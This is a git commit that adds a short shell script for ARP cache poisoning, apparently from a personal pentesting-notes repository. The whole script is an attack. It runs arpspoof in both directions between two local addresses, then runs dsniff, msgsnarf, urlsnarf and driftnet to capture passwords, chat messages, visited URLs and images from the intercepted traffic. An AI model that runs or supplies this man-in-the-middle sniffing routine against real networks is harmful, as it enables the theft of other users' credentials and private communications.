1303aa7073475d9d018fa81b09c47fdce1f03887
Daniel J Wilcox <danieljwilcox@gmail.com>
2013-06-02 18:46:11 +0100

    arpcache posioning

---
+++ backtrack/arpcache-posioning.sh
@@ -0,0 +1,19 @@
+#!/bin/sh
+
+# arpcache posioning
+
+sudo arpspoof -t 192.168.1.1 192.168.1.2
+
+sudo arpspoof -t 192.168.1.2 192.168.1.1
+
+# msgsnarf for grabbing messages
+msgsnarf -i wlan0 
+
+# urlsnarf grab urls
+urlsnarf -i wlan0
+
+# dsniff grab passwords
+dsniff -i wlan0
+
+# driftnet grab images
+driftnet -i wlan0
